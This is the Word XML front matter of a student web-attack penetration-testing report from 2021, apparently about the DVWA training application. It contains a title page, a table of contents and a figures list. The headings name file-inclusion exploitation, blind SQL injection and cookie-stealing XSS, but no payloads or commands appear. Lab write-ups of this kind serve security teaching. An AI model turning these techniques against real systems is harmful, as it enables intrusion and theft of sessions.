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EC6686" w14:textId="6C172D69" w:rsidR="007058A3" w:rsidRDefault="0084558E" w:rsidP="0084558E">
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00173543">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-AU"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6E56B7A2" wp14:editId="2E7452D9">
                <wp:extent cx="399245" cy="399245"/>
                <wp:effectExtent l="0" t="0" r="9525" b="1270"/>
                <wp:docPr id="2" name="Oval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9245" cy="399245"/>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2D9AFF8" id="Oval 2" o:spid="_x0000_s1026" alt="&quot;&quot;" style="width:31.45pt;height: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" fillcolor="#eed0c6 [3206]" stroked="f" strokeweight="2pt">
                <w10:anchorlock/>
              </v:oval>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="0084558E">
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007058A3">
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Web Attacks Report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E68068" w14:textId="0B05799D" w:rsidR="0084558E" w:rsidRDefault="007058A3" w:rsidP="0084558E">
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:r w:rsidR="0084558E" w:rsidRPr="009E3B85">
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Network Penetration Testing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="580001D0" w14:textId="556E0566" w:rsidR="00856259" w:rsidRPr="008A5F4C" w:rsidRDefault="0084558E" w:rsidP="0084558E">
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:r w:rsidRPr="009E3B85">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CRN 50250</w:t>
      </w:r>
      <w:r w:rsidR="00D85677" w:rsidRPr="00D85677">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:color w:val="44546A"/>
          <w:sz w:val="96"/>
          <w:szCs w:val="96"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251681792" behindDoc="1" locked="1" layoutInCell="1" allowOverlap="1" wp14:anchorId="75DCE50D" wp14:editId="0CF011FE">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>0</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="page">
                  <wp:posOffset>1057275</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="7781925" cy="7858125"/>
                <wp:effectExtent l="0" t="0" r="9525" b="9525"/>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81925" cy="78581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FAACF" id="Rectangle 6" o:spid="_x0000_s1026" alt="&quot;&quot;" style="position:absolute;margin-left:0;margin-top:83.25pt;width:612.75pt;height:618.7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&#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" stroked="f" strokeweight="2pt">
                <v:fill r:id="rId12" o:title="" recolor="t" rotate="t" type="frame"/>
                <v:stroke miterlimit="4"/>
                <v:textbox inset="3pt,3pt,3pt,3pt"/>
                <w10:wrap anchorx="page" anchory="page"/>
                <w10:anchorlock/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="9498" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="0600" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:noHBand="1" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1870"/>
        <w:gridCol w:w="1870"/>
        <w:gridCol w:w="1870"/>
        <w:gridCol w:w="1870"/>
        <w:gridCol w:w="2018"/>
      </w:tblGrid>
      <w:tr w:rsidR="005276A8" w14:paraId="2E3DB520" w14:textId="77777777" w:rsidTr="009E3B85">
        <w:trPr>
          <w:trHeight w:val="1349"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1870" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="13526AB9" w14:textId="77777777" w:rsidR="005276A8" w:rsidRDefault="005276A8"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1870" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5BD4ECBC" w14:textId="77777777" w:rsidR="005276A8" w:rsidRDefault="005276A8"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1870" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="128AC49D" w14:textId="4CB2ED42" w:rsidR="005276A8" w:rsidRDefault="005276A8" w:rsidP="00537DAC">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3888" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
          </w:tcPr>
          <w:p w14:paraId="144B77C0" w14:textId="31CD0FDE" w:rsidR="009E3B85" w:rsidRPr="009E3B85" w:rsidRDefault="009E3B85" w:rsidP="009E3B85">
            <w:pPr>
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005276A8" w14:paraId="76E8D719" w14:textId="77777777" w:rsidTr="009E3B85">
        <w:trPr>
          <w:trHeight w:val="2858"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9498" w:type="dxa"/>
            <w:gridSpan w:val="5"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="105A6532" w14:textId="0B42B174" w:rsidR="005276A8" w:rsidRPr="00537DAC" w:rsidRDefault="005276A8" w:rsidP="00ED38DD">
            <w:pPr>
              <w:pStyle w:val="Title"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED38DD" w14:paraId="1801E07B" w14:textId="77777777" w:rsidTr="009E3B85">
        <w:trPr>
          <w:trHeight w:val="6768"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9498" w:type="dxa"/>
            <w:gridSpan w:val="5"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5D90D32A" w14:textId="77777777" w:rsidR="00ED38DD" w:rsidRDefault="00ED38DD" w:rsidP="00ED38DD">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005276A8" w14:paraId="2E395D8B" w14:textId="77777777" w:rsidTr="009E3B85">
        <w:trPr>
          <w:trHeight w:val="2736"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3740" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="5E95EBA6" w14:textId="77777777" w:rsidR="00D00ED1" w:rsidRDefault="00D00ED1" w:rsidP="00ED38DD">
            <w:pPr>
              <w:pStyle w:val="Heading2"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5A242044" w14:textId="68DB47CC" w:rsidR="00D00ED1" w:rsidRDefault="001753C5" w:rsidP="00ED38DD">
            <w:pPr>
              <w:pStyle w:val="Heading2"/>
            </w:pPr>
            <w:bookmarkStart w:id="0" w:name="_Toc64633246"/>
            <w:r w:rsidRPr="00173543">
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-AU"/>
              </w:rPr>
              <mc:AlternateContent>
                <mc:Choice Requires="wps">
                  <w:drawing>
                    <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3F5E536C" wp14:editId="20B328CF">
                      <wp:extent cx="1444625" cy="45719"/>
                      <wp:effectExtent l="0" t="0" r="3175" b="0"/>
                      <wp:docPr id="4"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1444625" cy="45719"/>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AE9E59" id="Rectangle 4" o:spid="_x0000_s1026" alt="&quot;&quot;" style="width:113.75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" fillcolor="#eed0c6 [3206]" stroked="f" strokeweight="2pt">
                      <w10:anchorlock/>
                    </v:rect>
                  </w:pict>
                </mc:Fallback>
              </mc:AlternateContent>
            </w:r>
            <w:bookmarkEnd w:id="0"/>
          </w:p>
          <w:p w14:paraId="2C3B1AA6" w14:textId="77777777" w:rsidR="001753C5" w:rsidRPr="00D00ED1" w:rsidRDefault="001753C5" w:rsidP="001753C5">
            <w:pPr>
              <w:pStyle w:val="TitlePage-Version"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D00ED1">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Date: </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>March 12</w:t>
            </w:r>
            <w:r w:rsidRPr="00D00ED1">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:vertAlign w:val="superscript"/>
              </w:rPr>
              <w:t>th</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>, 2021</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="727A1404" w14:textId="77777777" w:rsidR="001753C5" w:rsidRPr="00D00ED1" w:rsidRDefault="001753C5" w:rsidP="001753C5">
            <w:pPr>
              <w:pStyle w:val="TitlePage-Version"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D00ED1">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Project: </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>02-21</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="505EC2C1" w14:textId="77777777" w:rsidR="001753C5" w:rsidRPr="00D00ED1" w:rsidRDefault="001753C5" w:rsidP="001753C5">
            <w:pPr>
              <w:pStyle w:val="TitlePage-Version"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D00ED1">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Version 1.0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B0D8994" w14:textId="128FBFE2" w:rsidR="005276A8" w:rsidRDefault="005276A8" w:rsidP="00ED38DD">
            <w:pPr>
              <w:pStyle w:val="Heading2"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1B59F73E" w14:textId="1961EFAD" w:rsidR="005276A8" w:rsidRDefault="005276A8" w:rsidP="001753C5">
            <w:pPr>
              <w:pStyle w:val="TitlePage-Version"/>
              <w:jc w:val="left"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1870" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="656ED279" w14:textId="77777777" w:rsidR="005276A8" w:rsidRDefault="005276A8" w:rsidP="00ED38DD"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1870" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="678D5AB3" w14:textId="77777777" w:rsidR="005276A8" w:rsidRDefault="005276A8" w:rsidP="00ED38DD"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2018" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="34DD70B3" w14:textId="77777777" w:rsidR="005276A8" w:rsidRDefault="005276A8" w:rsidP="00ED38DD"/>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="229E00F9" w14:textId="1019452B" w:rsidR="00BE02BB" w:rsidRDefault="005D4907">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251679744" behindDoc="1" locked="1" layoutInCell="1" allowOverlap="1" wp14:anchorId="14D9E528" wp14:editId="4551E888">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>-104775</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="page">
                  <wp:posOffset>0</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="7886700" cy="10048875"/>
                <wp:effectExtent l="0" t="0" r="0" b="9525"/>
                <wp:wrapNone/>
                <wp:docPr id="8" name="Rectangle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886700" cy="10048875"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:schemeClr val="accent3">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D41CE" id="Rectangle 8" o:spid="_x0000_s1026" alt="&quot;&quot;" style="position:absolute;margin-left:-8.25pt;margin-top:0;width:621pt;height:791.2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" fillcolor="#eed0c6 [3206]" stroked="f" strokeweight="2pt">
                <v:fill opacity="26214f"/>
                <v:stroke miterlimit="4"/>
                <v:textbox inset="3pt,3pt,3pt,3pt"/>
                <w10:wrap anchorx="page" anchory="page"/>
                <w10:anchorlock/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:id w:val="-1122305629"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="58374E58" w14:textId="1F2160DD" w:rsidR="00D00ED1" w:rsidRDefault="00D00ED1">
          <w:pPr>
            <w:pStyle w:val="TOCHeading"/>
          </w:pPr>
          <w:r>
            <w:t>Table of Contents</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="4B4AD6E5" w14:textId="0C9C713A" w:rsidR="00D00ED1" w:rsidRDefault="00D00ED1" w:rsidP="00D00ED1">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rStyle w:val="Hyperlink"/>
              <w:color w:val="auto"/>
              <w:u w:val="none"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r>
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidRPr="00D00ED1">
            <w:rPr>
              <w:rStyle w:val="Hyperlink"/>
              <w:color w:val="auto"/>
              <w:u w:val="none"/>
            </w:rPr>
            <w:t>Table of Contents……………………………………………………………………………………………</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:rPr>
              <w:rStyle w:val="Hyperlink"/>
              <w:color w:val="auto"/>
              <w:u w:val="none"/>
            </w:rPr>
            <w:t>.</w:t>
          </w:r>
          <w:r w:rsidRPr="00D00ED1">
            <w:rPr>
              <w:rStyle w:val="Hyperlink"/>
              <w:color w:val="auto"/>
              <w:u w:val="none"/>
            </w:rPr>
            <w:t>….2</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="281FB0DC" w14:textId="46D02291" w:rsidR="00957B8D" w:rsidRDefault="00EA759D" w:rsidP="00957B8D">
          <w:r>
            <w:t>Executive Summary……………………………………………………………………………………………….</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>4</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="243D1BDC" w14:textId="3B663605" w:rsidR="00EA759D" w:rsidRDefault="00EA759D" w:rsidP="00957B8D">
          <w:r>
            <w:t xml:space="preserve">              Phases of Penetration Test………………………………………………………………………</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>4</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="7EEC4A9D" w14:textId="554D0C53" w:rsidR="00EA759D" w:rsidRDefault="00EA759D" w:rsidP="00957B8D">
          <w:r>
            <w:t xml:space="preserve">              Findings Overview………………………………………………………………………………… </w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>5</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="1A1F6916" w14:textId="063374B0" w:rsidR="00EA759D" w:rsidRDefault="00EA759D" w:rsidP="00957B8D">
          <w:r>
            <w:t xml:space="preserve">              Recommendations………………………………………………………………………………… </w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>5</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="36BECEC7" w14:textId="2B503903" w:rsidR="00EA759D" w:rsidRDefault="00EA759D" w:rsidP="00957B8D">
          <w:r>
            <w:t xml:space="preserve">              Severity Scale…………………………………………………………………………………………</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>6</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="0F6947C4" w14:textId="51C8FDD4" w:rsidR="00EA759D" w:rsidRDefault="00EA759D" w:rsidP="00957B8D">
          <w:r>
            <w:t>Exploitation………………………………………………………………………………………………………..</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>.</w:t>
          </w:r>
          <w:r>
            <w:t>..</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>7</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="192A15A9" w14:textId="0459DDA8" w:rsidR="00EA759D" w:rsidRDefault="00EA759D" w:rsidP="00957B8D">
          <w:r>
            <w:t xml:space="preserve">              1.</w:t>
          </w:r>
          <w:r w:rsidR="00ED0E81">
            <w:t>Local File Inclusion...................</w:t>
          </w:r>
          <w:r>
            <w:t>…………………………………………………………</w:t>
          </w:r>
          <w:r w:rsidR="00ED0E81">
            <w:t>.</w:t>
          </w:r>
          <w:r>
            <w:t>…..</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>7</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="0BBC8312" w14:textId="3E839EC2" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00957B8D">
          <w:r>
            <w:t xml:space="preserve">                  1.1. Checking For Vulnerability...................................................................</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>7</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="35BA795A" w14:textId="55DCF926" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00957B8D">
          <w:r>
            <w:t xml:space="preserve">                  1.2.</w:t>
          </w:r>
          <w:r w:rsidRPr="00ED0E81">
            <w:t xml:space="preserve"> </w:t>
          </w:r>
          <w:r w:rsidRPr="00ED0E81">
            <w:t>Uploading Malicious File To Exploit Local File Inclusion Further</w:t>
          </w:r>
          <w:r>
            <w:t>.....</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>9</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="7F1908F9" w14:textId="601BAC64" w:rsidR="00EA759D" w:rsidRDefault="00EA759D" w:rsidP="00957B8D">
          <w:r>
            <w:t xml:space="preserve">              2.</w:t>
          </w:r>
          <w:r w:rsidR="00ED0E81">
            <w:t>Remote File Inclusion..............................</w:t>
          </w:r>
          <w:r>
            <w:t>……………………………………………</w:t>
          </w:r>
          <w:r w:rsidR="00ED0E81">
            <w:t>..</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>..</w:t>
          </w:r>
          <w:r>
            <w:t>…</w:t>
          </w:r>
          <w:r w:rsidR="00ED0E81">
            <w:t>1</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>4</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="01B83CF4" w14:textId="6EB4FF83" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00957B8D">
          <w:r>
            <w:t xml:space="preserve">                  2.1.Checking For Vulnerability...................................................................1</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>4</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="45E3319C" w14:textId="17965C2C" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00957B8D">
          <w:r>
            <w:t xml:space="preserve">                  2.2.</w:t>
          </w:r>
          <w:r w:rsidRPr="00ED0E81">
            <w:t>Uploading Malicious File To Exploit Remote File Inclusion Further</w:t>
          </w:r>
          <w:r>
            <w:t>..1</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>5</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="35E5006A" w14:textId="20B16DAB" w:rsidR="00EA759D" w:rsidRDefault="00EA759D" w:rsidP="00957B8D">
          <w:r>
            <w:t xml:space="preserve">              3.</w:t>
          </w:r>
          <w:r w:rsidR="00ED0E81">
            <w:t>SQL</w:t>
          </w:r>
          <w:r>
            <w:t>…………………</w:t>
          </w:r>
          <w:r w:rsidR="00ED0E81">
            <w:t>.........................................................</w:t>
          </w:r>
          <w:r>
            <w:t>……………………………….</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>.</w:t>
          </w:r>
          <w:r>
            <w:t>.</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>18</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="67D74EE0" w14:textId="256889C5" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
          <w:r>
            <w:t xml:space="preserve">                  </w:t>
          </w:r>
          <w:bookmarkStart w:id="1" w:name="_Hlk67660752"/>
          <w:r>
            <w:t>3</w:t>
          </w:r>
          <w:r>
            <w:t>.1.Checking For Vulnerability...................................................................1</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>8</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="49F9C389" w14:textId="1A281B19" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
          <w:r>
            <w:t xml:space="preserve">                  </w:t>
          </w:r>
          <w:r>
            <w:t>3</w:t>
          </w:r>
          <w:r>
            <w:t>.2.</w:t>
          </w:r>
          <w:r w:rsidRPr="00ED0E81">
            <w:t xml:space="preserve"> </w:t>
          </w:r>
          <w:r w:rsidRPr="00ED0E81">
            <w:t xml:space="preserve">Exploiting Blind </w:t>
          </w:r>
          <w:proofErr w:type="spellStart"/>
          <w:r w:rsidRPr="00ED0E81">
            <w:t>SQLi</w:t>
          </w:r>
          <w:proofErr w:type="spellEnd"/>
          <w:r w:rsidRPr="00ED0E81">
            <w:t xml:space="preserve"> Vulnerability</w:t>
          </w:r>
          <w:r>
            <w:t>.................................................</w:t>
          </w:r>
          <w:r>
            <w:t>..</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>20</w:t>
          </w:r>
        </w:p>
        <w:bookmarkEnd w:id="1"/>
        <w:p w14:paraId="324A9B68" w14:textId="68B085A0" w:rsidR="00EA759D" w:rsidRDefault="00ED0E81" w:rsidP="00957B8D">
          <w:r>
            <w:t xml:space="preserve">              </w:t>
          </w:r>
          <w:r w:rsidR="00EA759D">
            <w:t>4.</w:t>
          </w:r>
          <w:r>
            <w:t>Cross-Site Scripting XSS</w:t>
          </w:r>
          <w:r w:rsidR="00EA759D">
            <w:t>..........................................................................</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>......</w:t>
          </w:r>
          <w:r w:rsidR="00EA759D">
            <w:t>.</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>.</w:t>
          </w:r>
          <w:r w:rsidR="00EA759D">
            <w:t>..</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>24</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="29C9F265" w14:textId="549CC9AD" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
          <w:r>
            <w:t xml:space="preserve">                  4</w:t>
          </w:r>
          <w:r>
            <w:t>.1.Checking For Vulnerability...................................................................</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>24</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="6FF2C6B1" w14:textId="4DF71B5C" w:rsidR="00C5264E" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
          <w:r>
            <w:t xml:space="preserve">                  </w:t>
          </w:r>
          <w:r>
            <w:t>4</w:t>
          </w:r>
          <w:r>
            <w:t xml:space="preserve">.2. </w:t>
          </w:r>
          <w:r w:rsidR="00C5264E" w:rsidRPr="00C5264E">
            <w:t>Exploiting Reflected XSS To Get User’s Session Cookie</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>...</w:t>
          </w:r>
          <w:r>
            <w:t>.........</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>.......</w:t>
          </w:r>
          <w:r>
            <w:t>..</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>26</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="19C4E5BD" w14:textId="04C2BFA7" w:rsidR="00EA759D" w:rsidRDefault="00EA759D" w:rsidP="00957B8D">
          <w:r>
            <w:t>Appendix......................................................................................................................</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>.</w:t>
          </w:r>
          <w:r>
            <w:t>.....</w:t>
          </w:r>
          <w:r w:rsidR="00C5264E">
            <w:t>28</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="125CD0F6" w14:textId="77777777" w:rsidR="00EA759D" w:rsidRPr="00957B8D" w:rsidRDefault="00EA759D" w:rsidP="00957B8D"/>
        <w:p w14:paraId="65DAFD7C" w14:textId="77777777" w:rsidR="00D00ED1" w:rsidRPr="00D00ED1" w:rsidRDefault="00D00ED1" w:rsidP="00D00ED1"/>
        <w:p w14:paraId="502F9FA4" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00D00ED1">
          <w:pPr>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="799CA968" w14:textId="48D5E143" w:rsidR="00D00ED1" w:rsidRPr="00C5264E" w:rsidRDefault="008822EB">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Table of Figures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8C8676" w14:textId="200F4DB6" w:rsidR="00D00ED1" w:rsidRDefault="00D00ED1"/>
    <w:p w14:paraId="6B992541" w14:textId="5A1A67C5" w:rsidR="008822EB" w:rsidRDefault="008822EB">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> TOC \h \z \c "Figure" </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:hyperlink w:anchor="_Toc64889312" w:history="1">
        <w:r w:rsidR="00ED0E81" w:rsidRPr="00ED0E81">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 1.1: DVWA File Inclusion Page</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00C5264E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>6</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
